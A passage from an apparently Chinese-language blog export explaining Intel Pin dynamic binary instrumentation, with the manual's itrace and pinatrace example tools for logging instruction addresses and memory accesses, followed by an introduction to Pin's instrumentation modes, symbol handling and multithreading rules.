中。</p>\n<p>运行指令和结果如下：<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">..<span class=\"regexp\">/../</span>..<span class=\"regexp\">/pin -t obj-intel32/i</span>trace.so -- <span class=\"regexp\">/bin/</span>ls</div><div class=\"line\"></div><div class=\"line\">head itrace.out</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ezr0c4mj07j30mr0enac6.jpg\" alt=\"\"></p>\n<p>此示例在 source/tools/ManualExamples/itrace.cpp</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"></div><div class=\"line\">FILE * trace;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called before every instruction is executed</span></div><div class=\"line\"><span class=\"comment\">// and prints the IP</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">printip</span><span class=\"params\">(VOID *ip)</span> </span>&#123; <span class=\"built_in\">fprintf</span>(trace, <span class=\"string\">\"%p\\n\"</span>, ip); &#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new instruction is encountered</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Instruction</span><span class=\"params\">(INS ins, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Insert a call to printip before every instruction, and pass it the IP</span></div><div class=\"line\">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)printip, IARG_INST_PTR, IARG_END);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called when the application exits</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(trace, <span class=\"string\">\"#eof\\n\"</span>);</div><div class=\"line\">    fclose(trace);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_ERROR(<span class=\"string\">\"This Pintool prints the IPs of every instruction executed\\n\"</span> </div><div class=\"line\">              + KNOB_BASE::StringKnobSummary() + <span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    trace = fopen(<span class=\"string\">\"itrace.out\"</span>, <span class=\"string\">\"w\"</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Initialize pin</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Instruction to be called to instrument instructions</span></div><div class=\"line\">    INS_AddInstrumentFunction(Instruction, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Fini to be called when the application exits</span></div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h1 id=\"Memory-Reference-Trace-Instruction-Instrumentation\"><a href=\"#Memory-Reference-Trace-Instruction-Instrumentation\" class=\"headerlink\" title=\"Memory Reference Trace (Instruction Instrumentation)\"></a>Memory Reference Trace (Instruction Instrumentation)</h1><p>上两个例子都是插桩所有指令，但有时只想对一类指令插桩，如内存操作或分支指令。<br>可以通过调用包含 分类和检查指令功能的Pin API实现，具体描述参见<a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/group__INS__BASIC__API.html\" target=\"_blank\" rel=\"external\">这里</a>。此外，<font color=\"red\">此功能是 IA-32 ISA 特有的。</font></p>\n<p>此例展示如何通过检查指令，选择性插桩，并生成程序引用的内存的轨迹。这有助于调试程序和模拟处理器数据缓存。</p>\n<p>本例中，只插桩 读、写内存指令。由于插装函数只调用一次，而每次执行指令时都会调用分析函数，因此只对内存操作插桩比上例中插桩每条指令快得多。</p>\n<p>运行命令和结果如下：<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">..<span class=\"regexp\">/../</span>..<span class=\"regexp\">/pin -t obj-ia32/</span>pinatrace.so -- <span class=\"regexp\">/bin/</span>ls</div><div class=\"line\"></div><div class=\"line\">head pinatrace.out</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ezr17kh5krj30k10ijmzn.jpg\" alt=\"\"></p>\n<p>示例程序为 source/tools/ManualExamples/pinatrace.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> *  This file contains an ISA-portable PIN tool for tracing memory accesses.</div><div class=\"line\"> */</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">FILE * trace;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Print a memory read record</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">RecordMemRead</span><span class=\"params\">(VOID * ip, VOID * addr)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(trace,<span class=\"string\">\"%p: R %p\\n\"</span>, ip, addr);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Print a memory write record</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">RecordMemWrite</span><span class=\"params\">(VOID * ip, VOID * addr)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(trace,<span class=\"string\">\"%p: W %p\\n\"</span>, ip, addr);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Is called for every instruction and instruments reads and writes</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Instruction</span><span class=\"params\">(INS ins, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Instruments memory accesses using a predicated call, i.e.</span></div><div class=\"line\">    <span class=\"comment\">// the instrumentation is called iff the instruction will actually be executed.</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    <span class=\"comment\">// On the IA-32 and Intel(R) 64 architectures conditional moves and REP </span></div><div class=\"line\">    <span class=\"comment\">// prefixed instructions appear as predicated instructions in Pin.</span></div><div class=\"line\">    UINT32 memOperands = INS_MemoryOperandCount(ins);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Iterate over each memory operand of the instruction.</span></div><div class=\"line\">    <span class=\"keyword\">for</span> (UINT32 memOp = <span class=\"number\">0</span>; memOp &lt; memOperands; memOp++)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (INS_MemoryOperandIsRead(ins, memOp))</div><div class=\"line\">        &#123;</div><div class=\"line\">            INS_InsertPredicatedCall(</div><div class=\"line\">                ins, IPOINT_BEFORE, (AFUNPTR)RecordMemRead,</div><div class=\"line\">                IARG_INST_PTR,</div><div class=\"line\">                IARG_MEMORYOP_EA, memOp,</div><div class=\"line\">                IARG_END);</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"comment\">// Note that in some architectures a single memory operand can be </span></div><div class=\"line\">        <span class=\"comment\">// both read and written (for instance incl (%eax) on IA-32)</span></div><div class=\"line\">        <span class=\"comment\">// In that case we instrument it once for read and once for write.</span></div><div class=\"line\">        <span class=\"keyword\">if</span> (INS_MemoryOperandIsWritten(ins, memOp))</div><div class=\"line\">        &#123;</div><div class=\"line\">            INS_InsertPredicatedCall(</div><div class=\"line\">                ins, IPOINT_BEFORE, (AFUNPTR)RecordMemWrite,</div><div class=\"line\">                IARG_INST_PTR,</div><div class=\"line\">                IARG_MEMORYOP_EA, memOp,</div><div class=\"line\">                IARG_END);</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(trace, <span class=\"string\">\"#eof\\n\"</span>);</div><div class=\"line\">    fclose(trace);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\">   </div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_ERROR( <span class=\"string\">\"This Pintool prints a trace of memory addresses\\n\"</span> </div><div class=\"line\">              + KNOB_BASE::StringKnobSummary() + <span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\"></div><div class=\"line\">    trace = fopen(<span class=\"string\">\"pinatrace.out\"</span>, <span class=\"string\">\"w\"</span>);</div><div class=\"line\"></div><div class=\"line\">    INS_AddInstrumentFunction(Instruction, <span class=\"number\">0</span>);</div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/index.html#EXAMPLES\" target=\"_blank\" rel=\"external\">Pin 用户手册：Examples</a></p>\n"},{"title":"Intel Pin 1 ：如何使用Pin进行插桩","url":"http://huirong.github.io/2015/12/30/Intel-Pin-introduction/","content":"<p>Pin是Intel公司开发的动态二进制插桩框架，可以用于创建基于动态程序分析工具，支持IA-32和x86-64指令集架构，支持windows和linux。<br><a id=\"more\"></a><br>简单说就是Pin可以监控程序的每一步执行，提供了丰富的API，可以在二进制程序程序运行过程中插入各种函数，比如说我们要统计一个程序执行了多少条指令，每条指令的地址等信息。</p>\n<h1 id=\"Pin\"><a href=\"#Pin\" class=\"headerlink\" title=\"Pin\"></a>Pin</h1><p>认识Pin的最好方法是认为它是一个JIT编译器。这个编译器的输入不是字节码而是普通的可执行文件。Pin截获这个可执行文件的第一条指令，产生新的代码序列。接着将控制流程转移到这个产生的序列。产生的序列基本上跟原来的序列是一样的，但是Pin保证在一个分支结束后重新获得控制权。重新获得控制权之后，Pin为分支的目标产生代码并且执行。Pin通过将所有产生的代码放在内存中，以便于重新使用这些代码并且可以直接从一个分支跳到另一个分支，这提高了效率。</p>\n<p>在JIT模式，执行的代码都是Pin生成的代码。原始代码仅仅是用来参考。当生成代码时，Pin给用户提供了插入自己代码的机会（插桩）。</p>\n<p>Pin的桩代码都会被实际执行的，不论他们位于哪里。大体上，对于条件分支存在一些异常，比如，如果一个指令从不执行，它将不会被插入桩函数。</p>\n<h1 id=\"Pintools\"><a href=\"#Pintools\" class=\"headerlink\" title=\"Pintools\"></a>Pintools</h1><p>从概念上讲，插桩包括两个组件：</p>\n<ul>\n<li>决定在哪里插入什么代码的机制</li>\n<li>插入点执行的代码</li>\n</ul>\n<p>这两个组件就是<strong> 桩 </strong>和 <strong> 分析 </strong> 代码。两个组件都在一个单独的可执行体中，即Pintool。Pintools可以认为是在Pin中的的插件，它能够修改生成代码的流程。</p>\n<p>Pintool在Pin中注册一些 <strong> 桩 </strong> 回调函数，每当Pin生成新的代码时就调用回调函数。这些回调函数代表了 <strong> 桩 </strong> 组件。它可以检查将要生成的代码，得到它的静态属性，并且决定是否需要以及在哪里插入 <strong> 分析函数 </strong>。</p>\n<p> <strong> 分析函数 </strong> 收集关于程序的数据。Pin保证整数和浮点指针寄存器的状态在必要时会被保存和回复，允许传递参数给（分析）函数。</p>\n<p>Pintool也可以注册一些事件通知类回调函数，比如线程创建和fork，这些回调大体上用于数据收集或者初始化与清理。</p>\n<h1 id=\"Observations\"><a href=\"#Observations\" class=\"headerlink\" title=\"Observations\"></a>Observations</h1><p>由于Pintool类似插件一样工作，所以它必须处于Pin与被插桩的可执行文件的地址空间。这样，Pintool就能够访问可执行文件的所有数据。它也跟可执行文件共享文件描述符与进程其他信息。</p>\n<p>Pin和Pintool从第一条指令控制程序。对于与共享库一起编译的可执行文件，这意味着动态加载器和共享库将会对Pintool可见。</p>\n<p>当编写tools时，最重要的是调整分析代码而不是桩代码。因为桩代码执行一次，而分析代码执行许多次。</p>\n<h1 id=\"Instrumentation-Granularity（插桩粒度）\"><a href=\"#Instrumentation-Granularity（插桩粒度）\" class=\"headerlink\" title=\"Instrumentation Granularity（插桩粒度）\"></a>Instrumentation Granularity（插桩粒度）</h1><h2 id=\"1、trace-instrumentation（踪迹插桩）\"><a href=\"#1、trace-instrumentation（踪迹插桩）\" class=\"headerlink\" title=\"1、trace instrumentation（踪迹插桩）\"></a>1、trace instrumentation（踪迹插桩）</h2><p>如上所述，Pin的插桩是实时的。插桩发生在一段代码序列执行之前。我们把这种模式叫做踪迹插桩（trace instrumentation）。</p>\n<p>踪迹插桩让Pintool在可执行代码每一次执行时都能进行监视和插桩。trace通常开始于选中的分支目标并结束于一个非条件分支（ unconditional branch ），包括调用(call)和返回(return)。Pin能够保证trace只在最上层有一个入口，但是可以有很多出口。如果在一个trace中发生分支，Pin从分支目标开始构造一个新的trace。Pin根据基本块(BBL)分割trace。一个基本块是一个有唯一入口和出口的指令序列。基本块中的分支会开始一个新的trace也即一个新的基本块。通常为每个基本块而不是每条指令插入一个分析调用。减少分析调用的次数可以提高插桩的效率。trace插桩利用了TRACE_AddInstrumentFunction API call。</p>\n<p>注意，虽然Pin从程序执行中动态发现执行流，Pin的BBL与编译原理中的BBL定义不同。如，考虑生成下面的switch statement：<br><figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">switch</span>(i)</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4</span>: total++;</div><div class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3</span>: total++;</div><div class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>: total++;</div><div class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>: total++;</div><div class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0</span>:</div><div class=\"line\">    <span class=\"keyword\">default</span>: <span class=\"keyword\">break</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>它将会产生如下的指令（在IA-32架构上）<br><figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">.L7:</div><div class=\"line\">        addl    $1, <span class=\"number\">-4</span>(%ebp)</div><div class=\"line\">.L6:</div><div class=\"line\">        addl    $1, <span class=\"number\">-4</span>(%ebp)</div><div class=\"line\">.L5:</div><div class=\"line\">        addl    $1, <span class=\"number\">-4</span>(%ebp)</div><div class=\"line\">.L4:</div><div class=\"line\">        addl    $1, <span class=\"number\">-4</span>(%ebp)</div></pre></td></tr></table></figure></p>\n<p>在经典的基本块中，每一个addl指令会成为一个单指令基本块。然而对于不同的 switch cases，Pin 会产生包含 4 条指令的 BBL（当遇到.L7 case），3 条指令的基本块（当遇到.L6 case），如此类推。这就是说Pin的BBL个数会跟用书上的定义的BBL不一样。例如，这里当代码分支到.L7时，只有1个BBL，但是有四个经典的基本块被执行。</p>\n<p>Pin也会拆散其他指令为BBL，比如cpuid,popf,和rep前缀的指令。因为rep前缀指令被当做隐式的循环，如果一个rep前缀指令不止循环一次，在第一迭代之后将会产生一个单指令的BBL，所以这种情形会产生比你预期多的基本块。</p>\n<h2 id=\"2、instruction-instrumentation（指令插桩）\"><a href=\"#2、instruction-instrumentation（指令插桩）\" class=\"headerlink\" title=\"2、instruction instrumentation（指令插桩）\"></a>2、instruction instrumentation（指令插桩）</h2><p>为了方便编写Pintool，Pin还提供了指令插桩模式（instruction instrumentation mode），让工具可以监视和插桩每一条指令。本质上来说这两种模式是一样的，编写Pintool时不需要在为trace的每条指令反复处理。就像在trace插桩模式下一样，特定的基本块和指令可能会被生成很多次。指令插桩用到了 INS_AddInstrumentFunction API call。</p>\n<h2 id=\"3、Image-instrumentation（镜像插桩）\"><a href=\"#3、Image-instrumentation（镜像插桩）\" class=\"headerlink\" title=\"3、Image instrumentation（镜像插桩）\"></a>3、Image instrumentation（镜像插桩）</h2><p>有时，进行不同粒度的插桩比trace更有用。Pin对这种模式提供了两种模式：<strong> 镜像 </strong>和 <strong> 函数 </strong> 插桩。这些模式是通过缓存插桩要求，因此需要额外的空间，这些模式也称作提前插桩。</p>\n<p> <strong> 镜像 </strong> 插桩让Pintool在IMG第一次导入的时候对整个image进行监视和插桩。Pintool的处理范围可以是镜像中的每个块(section，SEC)，块中的每个函数(routine, RTN)，函数中的每个指令（instruction, INS），因此可以在函数执行前后或指令执行前后进行插桩。<br>镜像插桩用到了 IMG_AddInstrumentFunction API call。镜像插桩依靠符号信息判断函数的边界，因此需要在PIN_Init之前调用PIN_InitSymbols。</p>\n<h2 id=\"4、Routine-instrumentation（函数插桩）\"><a href=\"#4、Routine-instrumentation（函数插桩）\" class=\"headerlink\" title=\"4、Routine instrumentation（函数插桩）\"></a>4、Routine instrumentation（函数插桩）</h2><p> <strong> 函数 </strong> 插桩让Pintool在它所在的镜像首次加载时监视和插桩整个函数。Pintool的处理范围可以是函数里的每条指令。这里没有足够的信息把指令归并成基本块。可以在函数或指令执行前后进行插桩。函数插桩时Pintool的编写者能够更方便的在镜像插桩过程中遍历各个sections。<br>函数插桩用到了RTN_AddInstrumentFunction API call。插桩在函数结束后不一定能可靠地工作，因为当最后出现调用时无法判断何时返回。</p>\n<p>注意在镜像插桩和函数插桩中，不可能知道一个(分析）函数会被执行（因为这些插桩发生在镜像载入时）。在Trace和Instruction中只有被执行的代码才会被遍历。</p>\n<h1 id=\"Managed-platforms-support\"><a href=\"#Managed-platforms-support\" class=\"headerlink\" title=\"Managed platforms support\"></a>Managed platforms support</h1><p>Pin支持所有可执行文件包括托管的二进制文件。从Pin的角度来看，托管文件是一种自修改程序。有一种方法可以使Pin区分即时编译代码(Jitted代码)和其他所有动态生成的代码,并且将Jitted代码与合适的管理函数联系在一起。为了支持这个功能，运行管理托管平台的JIT compiler必须支持Jit Profiling API。</p>\n<p>必须支持下面的功能：</p>\n<ul>\n<li>RTN_IsDynamic() API,用来识别动态生成的代码。一个函数必须被Jit Profiling API标记为动态生成的。</li>\n<li>Pin tool,可以使用RTN_AddInstrumentFunction API 插桩 Jitted 函数</li>\n</ul>\n<p>为了支持托管平台，以下条件必须满足：</p>\n<ul>\n<li><p>设置INTEL_JIT_PROFILER32和INTEL_JIT_PROFILER64环境变量，以便占用pinjitprofiling dynamic library<br>对Windows</p>\n <figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> INTEL_JIT_PROFILER32=&lt;The Pin kit <span class=\"keyword\">full</span> <span class=\"keyword\">path</span>&gt;\\ia32\\<span class=\"keyword\">bin</span>\\pinjitprofiling.dll</div><div class=\"line\"><span class=\"keyword\">set</span> INTEL_JIT_PROFILER64=&lt;The Pin kit <span class=\"keyword\">full</span> <span class=\"keyword\">path</span>&gt;\\intel64\\<span class=\"keyword\">bin</span>\\pinjitprofiling.dll</div></pre></td></tr></table></figure>\n<p> 对Linux</p>\n <figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">setenv INTEL_JIT_PROFILER32 <span class=\"params\">&lt;The Pin kit full path&gt;</span><span class=\"meta-keyword\">/ia32/</span>bin/libpinjitprofiling.so</div><div class=\"line\">setenv INTEL_JIT_PROFILER64 <span class=\"params\">&lt;The Pin kit full path&gt;</span><span class=\"meta-keyword\">/intel64/</span>bin/libpinjitprofiling.so</div></pre></td></tr></table></figure>\n</li>\n<li><p>在Pin命令行为Pin tool加入knob support_jit_api选项</p>\n</li>\n</ul>\n<h1 id=\"Symbols\"><a href=\"#Symbols\" class=\"headerlink\" title=\"Symbols\"></a>Symbols</h1><p>Pin可利用符号对象（SYM）访问函数名。符号对象仅仅提供了在程序中的关于函数的符号。其他类型的符号（如数据符号）需要通过tool单独获取。</p>\n<p>在Windows上，可以通过dbghelp.dll实现这个功能。注意在 桩函数 中使用dbghelp.dll并不安全，可能会导致死锁。一个可能的解决方案是通过一个不同的未被插桩的进程得到符号。</p>\n<p>在Linux上，libefl.so或者libdwarf.so可以用来获取符号信息。</p>\n<p>为了通过名字访问函数必须先调用PIN_InitSymbols。</p>\n<h1 id=\"Floating-Point-Support-in-Analysis-Routines\"><a href=\"#Floating-Point-Support-in-Analysis-Routines\" class=\"headerlink\" title=\"Floating Point Support in Analysis Routines\"></a>Floating Point Support in Analysis Routines</h1><p>Pin在执行各种分析函数时保持着程序的浮点指针状态。</p>\n<p>IARG_REG_VALUE不能作为浮点指针寄存器参数传给分析函数。</p>\n<h1 id=\"Instrumenting-Multi-threaded-Applications\"><a href=\"#Instrumenting-Multi-threaded-Applications\" class=\"headerlink\" title=\"Instrumenting Multi-threaded Applications\"></a>Instrumenting Multi-threaded Applications</h1><p>给多线程程序插桩时，多个合作线程访问全局数据时必须保证tool是线程安全的。Pin试图为tool提供传统C++程序的环境，但是在一个Pintool是不可以使用标准库的。比如，Linux tool不能使用pthread，Windows不能使用Win32API管理线程。作为替代，应该使用Pin提供的锁和线程管理API。</p>\n<p>Pintools在插入桩函数时，不需要添加显示锁，因为Pin是在得到VM lock内部锁之后执行这些函数的。然而，Pin并行执行分析代码和替代函数，所以Pintools如果访问这些函数，可能需要为全局数据加锁。</p>\n<p>Linux上的Pintools需要注意在分析函数或替代函数中使用C/C++标准库函数，因为链接到Pintools的C/C++标准函数不是线程安全的。一些简单C/C++函数本身是线程安全的，在调用时不需要加锁。但是，Pin没有提供一个线程安全函数的列表。如果有怀疑，需要在调用库函数的时候加锁。特别的，errno变量不是多线程安全的，使用这个变量的tool需要提供自己的锁。注意这些限制仅存在Unix平台，这些库函数在Windows上是线程安全的。</p>\n<p>Pin可以在线程开始和结束的时候插入回调函数。这有助于 Pintool 分配和操作线程局部数据，并存放于线程局部内存。</p>\n<p>Pin也提供了一个分析函数的参数（ARG_THREAD_ID），用于传递Pin指定的线程ID给调用的线程。这个ID跟操作系统的线程ID不同，它是一个从0开始的小整数。可以作为线程数据或是用户锁的索引。</p>\n<p>除了Pin线程ID，Pin API提供了有效的线程局部存储(TLS），提供了分配新的TLS key并将它关联到指定数据的清理函数的选项。进程中的每个线程都能够在自己的槽中存储和取得对应key的数据。所有线程中key对应的value都是NULL。</p>\n<p>False共享发生在多个线程访问相同的缓cache 